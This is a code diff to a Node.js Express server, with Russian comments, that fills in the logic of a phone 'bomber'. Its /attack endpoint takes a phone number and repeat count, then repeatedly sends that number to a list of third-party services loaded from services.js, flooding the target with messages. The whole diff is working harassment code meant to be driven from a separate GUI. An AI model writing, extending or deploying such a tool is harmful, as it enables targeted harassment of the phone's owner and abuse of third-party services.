@@ -1,22 +1,37 @@
 const express = require('express');
-const cors = require('cors'); // Обязательно для связи с GUI
+const cors = require('cors');
+const axios = require('axios');
+const services = require('./services.js');
+
 const app = express();
 
-// Разрешаем твоему GUI (с github.io) стучаться на этот сервер
-app.use(cors());
+app.use(cors()); // Это лечит "СЕРВЕР OFF"
 app.use(express.json());
 
-const PORT = process.env.PORT || 80; // Amvera любит порт 80
-
-app.post('/attack', (req, res) => {
+app.post('/attack', async (req, res) => {
     const { phone, repeats } = req.body;
-    console.log(`Принята атака на: ${phone}, повторов: ${repeats}`);
-    
-    // ТУТ ДОЛЖНА БЫТЬ ТВОЯ ЛОГИКА БОМБЕРА
-    
-    res.status(200).json({ status: "success", message: "Attack started" });
+    console.log(`[START] Атака на ${phone}`);
+
+    // Запускаем асинхронно, чтобы GUI не висел
+    for (let i = 0; i < repeats; i++) {
+        services.forEach(async (s) => {
+            try {
+                await axios({
+                    method: s.method,
+                    url: s.url,
+                    headers: s.headers,
+                    data: typeof s.data === 'function' ? s.data(phone) : s.data,
+                    timeout: 5000
+                });
+            } catch (err) {
+                console.error(`[ERR] ${s.name} failed`);
+            }
+        });
+        // Пауза 1 сек между кругами
+        await new Promise(r => setTimeout(r, 1000));
+    }
+    res.json({ success: true });
 });
 
-app.listen(PORT, () => {
-    console.log(`Сервер запущен на порту ${PORT}`);
-});
+// Слушаем порт 80, как требует Amvera
+app.listen(80, () => console.log('Crux Server Online on Port 80'));
